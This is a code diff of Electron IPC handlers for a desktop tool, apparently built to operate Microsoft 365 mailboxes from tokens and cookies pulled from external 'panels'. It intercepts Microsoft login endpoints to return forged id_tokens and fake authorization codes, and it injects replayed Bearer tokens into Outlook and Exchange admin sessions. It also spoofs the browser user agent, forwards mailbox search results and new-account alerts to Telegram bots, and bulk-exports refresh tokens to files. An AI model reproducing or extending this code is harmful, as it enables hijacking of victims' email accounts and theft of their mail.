+      const mailboxUrl = `${baseUrl}/admin/mailbox/${encodeURIComponent(account.email)}`;
+      console.log('Opening mailbox URL:', mailboxUrl);
+
+      // Create a browser window with Authorization header, persistent session per panel
+      const mailboxWindow = new BrowserWindow({
+        width: 1200,
+        height: 800,
+        show: true,
+        title: `Mailbox - ${account.email}`,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          partition: `persist:panel-${panel.id}`,
+        },
+      });
+
+      // Set extra headers
+      mailboxWindow.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
+        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
+        callback({ requestHeaders: details.requestHeaders });
+      });
+
+      // Load the mailbox URL
+      await mailboxWindow.loadURL(mailboxUrl);
+      return { success: true };
+    } catch (error: any) {
+      console.error('Failed to open mailbox:', error);
+      throw new Error(error?.message || String(error));
+    }
+  });
+
+  /** Open the linked panel’s admin UI (org mailboxes / network), not a single-mailbox view. */
+  ipcMain.handle('panel:openAdmin', async (_, accountId: string) => {
+    console.log('Open panel admin for account', accountId);
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const panels: any[] = store.panels || [];
+      const account = accounts.find((a: any) => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      const panel = panels.find((p: any) => p.id === account.panelId);
+      if (!panel) throw new Error('Panel not found');
+      if (!panel.token) throw new Error('Panel not authenticated');
+
+      const baseUrl = panel.url.replace(/\/$/, '');
+      const adminUrl = `${baseUrl}/admin`;
+      console.log('Opening panel admin URL:', adminUrl);
+
+      const adminWindow = new BrowserWindow({
+        width: 1280,
+        height: 860,
+        show: true,
+        title: `Admin — ${panel.name}`,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          partition: `persist:panel-${panel.id}`,
+        },
+      });
+
+      adminWindow.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
+        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
+        callback({ requestHeaders: details.requestHeaders });
+      });
+
+      await adminWindow.loadURL(adminUrl);
+      return { success: true };
+    } catch (error: any) {
+      console.error('Failed to open panel admin:', error);
+      throw new Error(error?.message || String(error));
+    }
+  });
+
+  /**
+   * Open any path under the linked panel origin with the same Bearer session as Panel Admin
+   * (e.g. admin/connectors, admin/smtp). Prevents ".." and off-origin URLs.
+   */
+  ipcMain.handle('panel:openPath', async (_, accountId: string, relativePath: string) => {
+    console.log('Open panel path for account', accountId, relativePath);
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const panels: any[] = store.panels || [];
+      const account = accounts.find((a: any) => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      const panel = panels.find((p: any) => p.id === account.panelId);
+      if (!panel) throw new Error('Panel not found');
+      if (!panel.token) throw new Error('Panel not authenticated');
+
+      const baseUrl = panel.url.replace(/\/$/, '');
+      let rel = String(relativePath || '').trim().replace(/^\/+/, '');
+      if (!rel) throw new Error('Path required');
+      if (/\.\.|%2e%2e/i.test(rel)) throw new Error('Invalid path');
+
+      const targetUrl = `${baseUrl}/${rel}`;
+      let parsed: URL;
+      try {
+        parsed = new URL(targetUrl);
+      } catch {
+        throw new Error('Invalid URL');
+      }
+      const baseOrigin = new URL(baseUrl).origin;
+      if (parsed.origin !== baseOrigin) {
+        throw new Error('Path must stay under the panel server');
+      }
+
+      const title = `${panel.name} — ${rel}`;
+
+      const win = new BrowserWindow({
+        width: 1280,
+        height: 860,
+        show: true,
+        title,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          partition: `persist:panel-${panel.id}`,
+        },
+      });
+
+      win.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
+        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
+        callback({ requestHeaders: details.requestHeaders });
+      });
+
+      await win.loadURL(targetUrl);
+      return { success: true };
+    } catch (error: any) {
+      console.error('Failed to open panel path:', error);
+      throw new Error(error?.message || String(error));
+    }
+  });
+
+  // Open Outlook web UI with token injection (or Exchange Admin Center when mode=exchangeAdmin)
+  ipcMain.handle(
+    'mailbox:openOutlook',
+    async (
+      _,
+      accountId: string,
+      options?: { mode?: 'owa' | 'exchangeAdmin'; authPreference?: 'token' | 'cookie' }
+    ) => {
+    const mode = options?.mode === 'exchangeAdmin' ? 'exchangeAdmin' : 'owa';
+    console.log('Open Outlook UI for account', accountId, 'mode=', mode);
+    appendOutlookDebug(`[Outlook] Open requested account=${accountId} mode=${mode}`);
+    try {
+      const storeData = await readStore();
+      const accountsList = (storeData.accounts || []) as any[];
+      const acc = accountsList.find((a: any) => a.id === accountId);
+      if (!acc?.email) throw new Error('Account not found');
+
+      const explicitToken = options?.authPreference === 'token';
+      const useCookiesPath =
+        !explicitToken &&
+        (acc.auth?.type === 'cookie' ||
+          options?.authPreference === 'cookie' ||
+          (acc.auth?.type === 'token' && acc.auth?.owaMailboxMode === 'cookie'));
+
+      if (useCookiesPath) {
+        const paste = getMicrosoftCookiePasteFromAccount(acc);
+        if (!paste) {
+          throw new Error(
+            'OWA cookie mode needs stored Microsoft session cookies. On Accounts, use “Pull OWA cookies from panel” (your panel must implement GET /api/mailbox/{email}/export-cookies), or add cookies to this account, or switch OWA mode back to OAuth tokens.'
+          );
+        }
+        await openOwaWithCookieSession(accountId, acc, paste, mode);
+        appendOutlookDebug(`[OutlookCookie] Window opened (cookie session) account=${accountId}`);
+        return { success: true as const, session: 'cookie' as const };
+      }
+
+      const bundle = await loadOwaTokenBundle(accountId);
+      const { account, accessToken, tokenResult, clientIdOverride, tokenPayload } = bundle;
+
+      console.log('[Outlook] Access token obtained, expires in', tokenResult.expiresIn, 'seconds');
+      appendOutlookDebug(`[Outlook] Access token acquired exp_in=${tokenResult.expiresIn}s`);
+
+      const partitionName = `persist:outlook-${accountId}`;
+      const outlookSession = session.fromPartition(partitionName);
+
+      applyOwaTokenBundleToRunningSession(accountId, bundle, outlookSession);
+      owaLastSuccessfulRefresh.set(accountId, Date.now());
+
+      try {
+        if (accessToken.split('.').length === 3) {
+          console.log('[Outlook] Token payload:', {
+            appid: tokenPayload.appid || tokenPayload.azp,
+            aud: tokenPayload.aud,
+            scp: tokenPayload.scp,
+            roles: tokenPayload.roles,
+            iss: tokenPayload.iss,
+            oid: tokenPayload.oid,
+            tid: tokenPayload.tid,
+            exp: tokenPayload.exp ? new Date(tokenPayload.exp * 1000).toISOString() : undefined,
+          });
+        }
+      } catch (err) {
+        console.warn('[Outlook] Failed to decode token for logging:', err);
+      }
+      console.log('[Outlook] Token scope from refresh:', tokenResult.scope);
+
+      const state = await readState();
+      if (state.owaClientId) {
+        console.log('[MAIN] owaClientId loaded from state:', state.owaClientId);
+      }
+      console.log('[MAIN] MSAL cache clientId:', clientIdOverride);
+      console.log('[DEBUG] Before generateMsalCache');
+      console.log('[Outlook] MSAL cache generated, entries:', Object.keys(msalCacheMap.get(accountId) || {}).length);
+      console.log('[DEBUG] Cache keys:', Object.keys(msalCacheMap.get(accountId) || {}));
+
+      await Promise.all([
+        outlookSession.cookies.set({
+          url: 'https://outlook.office.com',
+          name: 'DefaultAnchorMailbox',
+          value: `UPN:${account.email}`,
+          domain: '.outlook.office.com',
+          path: '/',
+          secure: true,
+          httpOnly: true,
+          sameSite: 'no_restriction',
+        }),
+        outlookSession.cookies.set({
+          url: 'https://login.microsoftonline.com',
+          name: 'DefaultAnchorMailbox',
+          value: `UPN:${account.email}`,
+          domain: '.login.microsoftonline.com',
+          path: '/',
+          secure: true,
+          httpOnly: true,
+          sameSite: 'no_restriction',
+        }),
+      ]);
+      console.log('[Outlook] DefaultAnchorMailbox cookies set (parallel)');
+
+      const startUrl =
+        mode === 'exchangeAdmin'
+          ? 'https://admin.exchange.microsoft.com/'
+          : 'https://outlook.office.com/mail/inbox';
+      const windowTitle =
+        mode === 'exchangeAdmin' ? `Exchange admin — ${account.email}` : `Outlook — ${account.email}`;
+
+      // Create browser window
+      const outlookWindow = new BrowserWindow({
+        width: 1400,
+        height: 900,
+        show: true,
+        title: windowTitle,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: false,
+          partition: partitionName,
+          preload: path.join(__dirname, 'preload-mailbox.js'),
+        },
+      });
+
+      // Map window to account for MSAL cache injection
+      const windowId = outlookWindow.webContents.id;
+      console.log('[Outlook] Mapping window', windowId, 'to account', accountId);
+      windowToAccountMap.set(windowId, accountId);
+
+      const OWA_REFRESH_INTERVAL_MS = 18 * 60 * 1000;
+      const owaRefreshTimer = setInterval(() => {
+        if (outlookWindow.isDestroyed()) {
+          clearInterval(owaRefreshTimer);
+          return;
+        }
+        void tryRefreshOwaWindowSession(accountId, outlookSession, outlookWindow.webContents, 0, 'interval');
+      }, OWA_REFRESH_INTERVAL_MS);
+
+      // Clean up mapping when window closes
+      outlookWindow.on('closed', () => {
+        clearInterval(owaRefreshTimer);
+        try {
+          outlookSession.protocol.unhandle('https');
+        } catch {
+          /* ignore */
+        }
+        windowToAccountMap.delete(windowId);
+        msalCacheMap.delete(accountId);
+        outlookTokenStore.delete(accountId);
+        owaLastSuccessfulRefresh.delete(accountId);
+      });
+
+      console.log('[Outlook] Window created with partition:', (outlookWindow.webContents.session as any).partition);
+
+      // --- OAuth flow interception (protocol-level, below all JavaScript) ---
+      // Register a protocol handler on this session that intercepts POST /token
+      // requests at the Chromium network layer. When OWA's MSAL tries to exchange
+      // an authorization code, we return our real tokens directly.
+      // Also intercept GET /authorize and return a fake code response.
+      // Token fields must be read from outlookTokenStore so scheduled refresh updates Bearer + MSAL responses.
+      const getOwaTok = () => outlookTokenStore.get(accountId);
+
+      function buildTokenResponse(nonce: string): string {
+        const t = getOwaTok();
+        if (!t) {
+          return JSON.stringify({
+            error: 'invalid_grant',
+            error_description: 'OWA token store empty',
+          });
+        }
+        const oid = t.oid || '';
+        const tid = t.tid || '';
+        const ci = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64');
+        const owaClientId = t.clientId || clientIdOverride;
+        const idH = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'dummy' })).toString('base64url');
+        const idP = Buffer.from(JSON.stringify({
+          aud: owaClientId, iss: `https://login.microsoftonline.com/${tid}/v2.0`,
+          iat: Math.floor(Date.now() / 1000) - 60, nbf: Math.floor(Date.now() / 1000) - 60,
+          exp: Math.floor(Date.now() / 1000) + 3600, nonce,
+          name: t.name || account.email, oid, preferred_username: t.email || account.email,
+          rh: '0.AAAA...', sub: oid, tid, ver: '2.0',
+        })).toString('base64url');
+        return JSON.stringify({
+          token_type: 'Bearer',
+          scope: t.scope || 'https://outlook.office.com/.default openid profile offline_access',
+          expires_in: t.expiresIn || 3600,
+          access_token: t.accessToken,
+          refresh_token: t.refreshToken,
+          id_token: `${idH}.${idP}.`,
+          client_info: ci,
+        });
+      }
+
+      // Same session partition survives window close; https can only be handled once per session.
+      try {
+        outlookSession.protocol.unhandle('https');
+      } catch {
+        /* no prior handler */
+      }
+
+      let tokenInterceptCount = 0;
+      outlookSession.protocol.handle('https', async (request) => {
+        const u = request.url;
+
+        // 1. Intercept POST /token — return our real tokens
+        if (request.method === 'POST' && u.includes('login.microsoftonline.com') &&
+            u.includes('/oauth2/') && u.includes('/token') && tokenInterceptCount < 200) {
+          try {
+            const body = await request.text();
+            const isAuthCodeGrant = body.includes('grant_type=authorization_code');
+            const isRefreshGrant = body.includes('grant_type=refresh_token');
+            if (isAuthCodeGrant || isRefreshGrant) {
+              tokenInterceptCount++;
+              const nonceMatch = isAuthCodeGrant ? body.match(/INTERCEPTED(?:%3A|:)([^&:%]+)/) : null;
+              const nonce = nonceMatch ? decodeURIComponent(nonceMatch[1]) : '';
+              const grantType = isAuthCodeGrant ? 'authorization_code' : 'refresh_token';
+              console.log('[ProtocolIntercept] Returning tokens for grant:', grantType, 'nonce:', nonce ? 'yes' : 'none');
+              appendOutlookDebug(`[ProtocolIntercept] Token exchange intercepted grant=${grantType} (#${tokenInterceptCount})`);
+              return new Response(buildTokenResponse(nonce), {
+                status: 200,
+                headers: { 'content-type': 'application/json' },
+              });
+            }
+          } catch (err) {
+            console.warn('[ProtocolIntercept] Body read error:', err);
+          }
+        }
+
+        // 2. Intercept GET /authorize — redirect back with a fake code
+        if (request.method === 'GET' && u.includes('login.microsoftonline.com') &&
+            u.includes('/authorize') && !u.includes('/devicecode')) {
+          try {
+            const au = new URL(u);
+            const redirectUri = au.searchParams.get('redirect_uri') || 'https://outlook.office.com/mail/';
+            const state = au.searchParams.get('state') || '';
+            const nonce = au.searchParams.get('nonce') || '';
+            const fakeCode = `INTERCEPTED:${nonce}:${Date.now()}`;
+            const t = getOwaTok();
+            const oidA = t?.oid || '';
+            const tidA = t?.tid || '';
+            const ci = Buffer.from(JSON.stringify({ uid: oidA, utid: tidA })).toString('base64');
+            const redirectTo = `${redirectUri}#code=${encodeURIComponent(fakeCode)}&state=${encodeURIComponent(state)}&client_info=${encodeURIComponent(ci)}&session_state=fake`;
+            console.log('[ProtocolIntercept] Redirecting authorize → fake code response');
+            appendOutlookDebug(`[ProtocolIntercept] Authorize intercepted, redirect → ${redirectUri}`);
+            return Response.redirect(redirectTo, 302);
+          } catch (err) {
+            console.warn('[ProtocolIntercept] Authorize intercept error:', err);
+          }
+        }
+
+        // 3. For OWA API calls — inject Bearer + anchor headers before forwarding.
+        //    protocol.handle bypasses webRequest hooks, so we must add auth here.
+        //    request.body is a ReadableStream; we must drain it to a Buffer before re-sending.
+        const isOwaApi =
+          /outlook\.office\.com|outlook\.office365\.com|outlook\.cloud\.microsoft|substrate\.office\.com|m365\.cloud\.microsoft|admin\.exchange\.microsoft\.com|admin\.microsoft\.com/i.test(
+            u
+          );
+        if (isOwaApi) {
+          const headers = new Headers(request.headers);
+          const t = getOwaTok();
+          if (t && !headers.has('Authorization')) {
+            headers.set('Authorization', `Bearer ${t.accessToken}`);
+          }
+          headers.set('X-AnchorMailbox', account.email);
+          headers.set('AnchorMailbox', account.email);
+          let body: Buffer | undefined;
+          if (request.body) {
+            try { body = Buffer.from(await request.arrayBuffer()); } catch { /* no body */ }
+          }
+          return net.fetch(u, {
+            method: request.method,
+            headers,
+            body: body && body.length > 0 ? body : undefined,
+            bypassCustomProtocolHandlers: true,
+            duplex: 'half',
+          } as any);
+        }
+
+        // Forward everything else normally
+        return net.fetch(request, { bypassCustomProtocolHandlers: true });
+      });
+      console.log('[Outlook] Protocol-level OAuth interceptor registered');
+      appendOutlookDebug('[Outlook] Protocol-level OAuth interceptor active');
+
+      outlookWindow.webContents.on('dom-ready', () => {
+        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
+      });
+
+      // Attach Bearer + anchor headers for all modern OWA / substrate hosts (session auth updated by applyOwaTokenBundle + refresh)
+      installOutlookPartitionRequestHooks(outlookSession);
+
+      outlookWindow.on('focus', () => {
+        void tryRefreshOwaWindowSession(accountId, outlookSession, outlookWindow.webContents, 8 * 60 * 1000, 'focus');
+      });
+
+      outlookWindow.webContents.on('did-redirect-navigation', (_event, url) => {
+        appendOutlookDebug(`[Outlook] Redirect: ${url}`);
+        const cid = extractClientIdFromUrl(url);
+        if (cid) {
+          void regenerateMsalCacheForClientId(accountId, cid).then((ok) => {
+            if (ok) void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
+          });
+        }
+      });
+      outlookWindow.webContents.on('did-navigate', (_event, url) => {
+        appendOutlookDebug(`[Outlook] Navigate: ${url}`);
+      });
+      outlookWindow.webContents.on('console-message', (_event, level, message, line, sourceId) => {
+        appendOutlookDebug(`[OWA console:${level}] ${message} (${sourceId}:${line})`);
+      });
+
+      outlookWindow.webContents.setUserAgent(
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+      );
+
+      outlookWindow.webContents.on('did-finish-load', () => {
+        console.log('[Outlook] Page finished loading:', outlookWindow.webContents.getURL());
+        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
+      });
+      outlookWindow.webContents.on('did-navigate-in-page', () => {
+        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
+      });
+
+      if (process.env.OPEN_OWA_DEVTOOLS === '1') {
+        outlookWindow.webContents.openDevTools({ mode: 'detach' });
+      }
+      outlookWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription, validatedURL) => {
+        console.error('[Outlook] Page failed to load:', errorCode, errorDescription, validatedURL);
+        appendOutlookDebug(`[Outlook] did-fail-load code=${errorCode} url=${validatedURL} desc=${errorDescription}`);
+      });
+
+      void outlookWindow
+        .loadURL(startUrl)
+        .then(() => {
+          console.log('[Outlook] Start URL loaded:', startUrl);
+          appendOutlookDebug(`[Outlook] Initial URL loaded (${mode}): ${startUrl}`);
+        })
+        .catch((loadErr: unknown) => {
+          console.error('[Outlook] loadURL failed:', loadErr);
+          appendOutlookDebug(`[Outlook] loadURL failed: ${loadErr instanceof Error ? loadErr.message : String(loadErr)}`);
+        });
+      console.log('[Outlook] Window opening (non-blocking load)');
+      appendOutlookDebug('[Outlook] loadURL started — IPC returns immediately');
+      return { success: true };
+    } catch (error: any) {
+      console.error('Failed to open Outlook UI:', error);
+      appendOutlookDebug(`[Outlook] Open failed: ${error?.message || String(error)}`);
+      const raw =
+        error?.code === 'REFRESH_TOKEN_EXPIRED'
+          ? 'Token refresh failed (invalid_grant). The token may have expired or have the wrong scope. Re-authenticate with EWS scope (https://outlook.office.com/EWS.AccessAsUser.All).'
+          : error?.message || String(error);
+      const d = diagnoseMicrosoftAuthError(raw);
+      const hint = [d.title, d.aadstsCode ? `(${d.aadstsCode})` : '', ...d.suggestions.slice(0, 3)]
+        .filter(Boolean)
+        .join(' — ');
+      throw new Error(`${raw}\n\n${hint}`);
+    }
+  });
+
+  /**
+   * Session bridge: open Microsoft authorize URL in the **system browser** (official OAuth redirect).
+   * User completes MFA/CA there; OWA loads after sign-in. Does not mint custom cookies.
+   */
+  ipcMain.handle('mailbox:openOwaExternalSignIn', async (_, accountId: string) => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const account = accounts.find((a: any) => a.id === accountId);
+    if (!account?.email) throw new Error('Account not found');
+    if (account.auth?.type !== 'token') {
+      throw new Error('Session bridge (browser) requires a Microsoft token account');
+    }
+    const ms = store.settings?.microsoftOAuth || {};
+    const clientId =
+      (typeof ms.clientId === 'string' && ms.clientId.trim()) || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const tenant = normalizeAuthorityTenant((typeof ms.tenantId === 'string' && ms.tenantId.trim()) || 'common');
+    const redirectUri =
+      (typeof ms.redirectUri === 'string' && ms.redirectUri.trim()) || 'https://outlook.office.com/mail/';
+    const scope = 'openid profile offline_access https://outlook.office.com/.default';
+    const lastOpen = sessionBridgeLastOpenAt.get(accountId) || 0;
+    if (Date.now() - lastOpen < 5000) {
+      appendOutlookDebug(`[SessionBridge] Skip duplicate open account=${accountId}`);
+      return { success: true as const, opened: false as const };
+    }
+    const authUrl =
+      `https://login.microsoftonline.com/${encodeURIComponent(tenant)}/oauth2/v2.0/authorize` +
+      `?client_id=${encodeURIComponent(clientId)}` +
+      `&response_type=code` +
+      `&redirect_uri=${encodeURIComponent(redirectUri)}` +
+      `&response_mode=query` +
+      `&scope=${encodeURIComponent(scope)}` +
+      `&login_hint=${encodeURIComponent(String(account.email))}` +
+      `&domain_hint=organizations`;
+    appendOutlookDebug(`[SessionBridge] openOwaExternalSignIn account=${accountId} tenant=${tenant}`);
+    try {
+      await shell.openExternal(authUrl);
+      sessionBridgeLastOpenAt.set(accountId, Date.now());
+    } catch (e: any) {
+      throw new Error(e?.message || 'Failed to open system browser');
+    }
+    return { success: true as const, opened: true as const };
+  });
+
+  // Telegram send alert
+  ipcMain.handle('telegram:sendAlert', async (_, bot: string, message: string) => {
+    try {
+      const store = await readStore();
+      const settings = store.settings?.telegram?.[bot];
+      if (!settings?.enabled || !settings.token || !settings.chatId) {
+        console.warn(`Telegram bot ${bot} not configured or disabled`);
+        return { success: false, error: 'Bot not configured' };
+      }
+      const result = await telegramSendWithRetry(settings.token, settings.chatId, message, 'HTML');
+      if (!result.success) logTelegramFailure(`alert:${bot}`, result.error || 'failed');
+      return result;
+    } catch (error) {
+      logTelegramFailure(`alert:${bot}`, String(error));
+      return { success: false, error: String(error) };
+    }
+  });
+
+  // Telegram send search results
+  ipcMain.handle('telegram:sendSearchResults', async (_, bot: string, results: any[]) => {
+    try {
+      const store = await readStore();
+      const settings = store.settings?.telegram?.[bot];
+      if (!settings?.enabled || !settings.token || !settings.chatId) {
+        console.warn(`Telegram bot ${bot} not configured or disabled`);
+        return { success: false, error: 'Bot not configured' };
+      }
+      const includeSnippets = Boolean(settings?.includeSnippets);
+      const token = settings.token;
+      const chatId = settings.chatId;
+
+      const buildLines = (slice: any[], startIndex: number): string => {
+        return slice
+          .map((r: any, i: number) => {
+            const subj = escapeTelegramHtmlPlain((r.subject || 'No subject').substring(0, 52));
+            const folder = escapeTelegramHtmlPlain(String(r.folder || ''));
+            let line = `${startIndex + i + 1}. ${subj} (${folder})`;
+            if (includeSnippets && r.snippet) {
+              const sn = escapeTelegramHtmlPlain(
+                String(r.snippet).replace(/\s+/g, ' ').trim().substring(0, 100)
+              );
+              line += `\n   <i>${sn}</i>`;
+            }
+            return line;
+          })
+          .join('\n');
+      };
+
+      const first = results.slice(0, 10);
+      let text = `<b>Search results (${results.length})</b>\n${buildLines(first, 0)}`;
+      if (results.length > 10) {
+        text += `\n<i>+ ${results.length - 10} more — continued below</i>`;
+      }
+      let send = await telegramSendWithRetry(token, chatId, text, 'HTML');
+      if (!send.success) {
+        logTelegramFailure(`search:${bot}`, send.error || 'failed');
+        return send;
+      }
+
+      if (results.length > 10) {
+        const second = results.slice(10, 25);
+        const text2 =
+          `<b>Search results (continued)</b>\n${buildLines(second, 10)}` +
+          (results.length > 25 ? `\n<i>+ ${results.length - 25} more in app</i>` : '');
+        send = await telegramSendWithRetry(token, chatId, text2, 'HTML');
+        if (!send.success) {
+          logTelegramFailure(`search:${bot}:part2`, send.error || 'failed');
+          return { success: false, error: send.error || 'Second message failed' };
+        }
+      }
+
+      return { success: true };
+    } catch (error) {
+      logTelegramFailure(`search:${bot}`, String(error));
+      return { success: false, error: String(error) };
+    }
+  });
+
+  // Telegram test
+  // Optional: renderer-side account create (e.g. panel sync) — same Telegram as IPC adds
+  ipcMain.handle('telegram:accountsNotify', async (_, email: string, via: string) => {
+    try {
+      const store = await readStore();
+      await sendAccountsTelegramNotification(
+        store,
+        `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> ${escapeTelegramHtmlPlain(via)}`
+      );
+      return { success: true };
+    } catch (error) {
+      logTelegramFailure('accounts:renderer-path', String(error));
+      return { success: false, error: String(error) };
+    }
+  });
+
+  ipcMain.handle('telegram:test', async (_, bot: string) => {
+    try {
+      const store = await readStore();
+      const settings = store.settings?.telegram?.[bot];
+      if (!settings?.enabled || !settings.token || !settings.chatId) {
+        console.warn(`Telegram bot ${bot} not configured or disabled`);
+        return { success: false, error: 'Bot not configured' };
+      }
+      const label = escapeTelegramHtmlPlain(bot);
+      const testText = `\u2705 <b>Watcher Telegram</b> bot <code>${label}</code> is working.`;
+      const result = await telegramSendWithRetry(settings.token, settings.chatId, testText, 'HTML');
+      if (!result.success) logTelegramFailure(`test:${bot}`, result.error || 'failed');
+      return result;
+    } catch (error) {
+      logTelegramFailure(`test:${bot}`, String(error));
+      return { success: false, error: String(error) };
+    }
+  });
+
+  // Import tokens from JSON file
+  ipcMain.handle('tokens:importJSON', async (_, filePath: string) => {
+    console.log('Import tokens from', filePath);
+    // TODO: read file, validate, add to store
+    return { success: true, count: 0 };
+  });
+
+  const exportTokensToPath = async (filePath: string): Promise<{ success: boolean; path?: string; count?: number; error?: string }> => {
+    try {
+      const outPath = String(filePath || '').trim();
+      if (!outPath) return { success: false, error: 'Export path is required' };
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const tokenAccounts = accounts
+        .filter((a: any) => a?.auth?.type === 'token')
+        .map((a: any) => ({
+          id: a.id,
+          email: a.email,
+          name: a.name,
+          status: a.status,
+          panelId: a.panelId || null,
+          tags: Array.isArray(a.tags) ? a.tags : [],
+          auth: {
+            type: 'token',
+            clientId: a.auth?.clientId,
+            authorityEndpoint: a.auth?.authorityEndpoint,
+            refreshToken: a.auth?.refreshToken,
+            scopeType: a.auth?.scopeType,
+            resource: a.auth?.resource,
+            v2Token: a.auth?.v2Token || undefined,
+          },
+          added: a.added,
+          lastRefresh: a.lastRefresh,
+        }));
+      const payload = {
+        exportedAt: new Date().toISOString(),
+        count: tokenAccounts.length,
+        tokens: tokenAccounts,
+      };
+      await fs.writeFile(outPath, JSON.stringify(payload, null, 2), 'utf8');
+      return { success: true, path: outPath, count: tokenAccounts.length };
+    } catch (error: any) {
+      return { success: false, error: error?.message || String(error) };
+    }
+  };
+
+  // Export tokens to JSON file
+  ipcMain.handle('tokens:exportJSON', async (_, filePath: string) => {
+    console.log('Export tokens to', filePath);
+    return exportTokensToPath(filePath);
+  });
+
+  // Export tokens with native save dialog (Dashboard-safe replacement for prompt()).
+  ipcMain.handle('tokens:exportJSONDialog', async () => {
+    const picked = await dialog.showSaveDialog({
+      title: 'Export token accounts',
+      defaultPath: `token-accounts-${new Date().toISOString().slice(0, 10)}.json`,
+      filters: [{ name: 'JSON', extensions: ['json'] }],
+      properties: ['createDirectory', 'showOverwriteConfirmation'],
+    });
+    if (picked.canceled || !picked.filePath) return { success: false, canceled: true as const };
+    return exportTokensToPath(picked.filePath);
+  });
+
+  // Clear activity feed
+  ipcMain.handle('activity:clear', async () => {
+    console.log('Clear activity feed');
+    // TODO: clear activity feed in state.json
+    return { success: true };
+  });
+
+  // --------------------------
+  // Panel IPC handlers (Phase 2)
+  // --------------------------
+  ipcMain.handle('panel:testConnection', async (_, url: string, username: string, password: string) => {
+    const normalizedUrl = normalizePanelUrl(url);
+    const loginUrl = `${normalizedUrl}/api/auth/login`;
+    let response: Response;
+    try {
+      response = await fetch(loginUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password }),
+        signal: timeoutSignal(15000),
+      } as any);
+    } catch (err: any) {
+      const msg = err?.cause?.message || err?.message || String(err);
+      throw new Error(`Cannot reach ${loginUrl}. Check the panel URL is correct and the server is running. (${msg})`);
+    }
+    if (!response.ok) {
+      const text = await response.text();
+      throw new Error(text || `Login failed with status ${response.status}`);
+    }
+    const data = await response.json();
+    return data.token;
+  });
+
+  ipcMain.handle('panel:save', async (_, name: string, url: string, username: string, password: string) => {
+    const normalizedUrl = normalizePanelUrl(url);
+    const store = await readStore();
+    const panels: any[] = store.panels || [];
+    // Check for duplicate
+    if (panels.some(p => p.url === normalizedUrl && p.username === username)) {
+      throw new Error('Panel with same URL and username already exists');
+    }
+    const newPanel = {
+      id: crypto.randomUUID(),
+      name,
+      url: normalizedUrl,
+      username,
+      passwordEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(password).toString('base64') : password,
+      status: 'disconnected',
+      token: null,
+      tokenExpiry: null,
+      error: null,
+    };
+    panels.push(newPanel);
+    store.panels = panels;
+    await writeStore(store);
+    return newPanel;
+  });
+
+  ipcMain.handle('panel:connect', async (_, panelId: string) => {
+    const store = await readStore();
+    const panels: any[] = store.panels || [];
+    const panel = panels.find(p => p.id === panelId);
+    if (!panel) throw new Error('Panel not found');
+    // Decrypt password
+    if (!safeStorage.isEncryptionAvailable()) {
+      throw new Error('Encryption not available');
+    }
+    const password = safeStorage.decryptString(Buffer.from(panel.passwordEncrypted, 'base64'));
+    // Test connection using same logic as panel:testConnection
+    const normalizedUrl = normalizePanelUrl(panel.url);
+    const loginUrl = `${normalizedUrl}/api/auth/login`;
+    let response: Response;
+    try {
+      response = await fetch(loginUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: panel.username, password }),
+        signal: timeoutSignal(15000),
+      } as any);
+    } catch (err: any) {
+      const msg = err?.cause?.message || err?.message || String(err);
+      throw new Error(`Cannot reach ${loginUrl}. Check the panel URL is correct and the server is running. (${msg})`);
+    }
+    if (!response.ok) {
+      const text = await response.text();
+      throw new Error(text || `Login failed with status ${response.status}`);
+    }
+    const data = await response.json();
+    const token = data.token;
+    // Update panel with token
+    panel.token = token;
+    panel.tokenExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
+    panel.status = 'connected';
+    panel.error = null;
+    await writeStore(store);
+    return panel;
+  });
+
+  ipcMain.handle('panel:disconnect', async (_, panelId: string) => {
+    const store = await readStore();
+    const panels: any[] = store.panels || [];
+    const panel = panels.find(p => p.id === panelId);
+    if (!panel) throw new Error('Panel not found');
+    panel.token = null;
+    panel.tokenExpiry = null;
+    panel.status = 'disconnected';
+    await writeStore(store);
+    return panel;
+  });
+
+  ipcMain.handle('panel:syncAll', async () => {
+    const store = await readStore();
+    const panels: any[] = store.panels || [];
+    const connected = panels.filter(p => p.status === 'connected');
+    const results = [];
+    for (const panel of connected) {
+      try {
+        // TODO: call panel API fetch accounts and sync
+        console.log(`Syncing panel ${panel.name}`);
+        results.push({ panelId: panel.id, success: true });
+      } catch (err) {
+        results.push({ panelId: panel.id, success: false, error: String(err) });
+      }
+    }
+    return results;
+  });
+
+  ipcMain.handle('panel:delete', async (_, panelId: string) => {
+    const store = await readStore();
+    store.panels = (store.panels || []).filter((p: any) => p.id !== panelId);
+    await writeStore(store);
+    // Detach accounts (replace panel tag with Detached) - will be handled by renderer service
+    return { success: true };
+  });
+
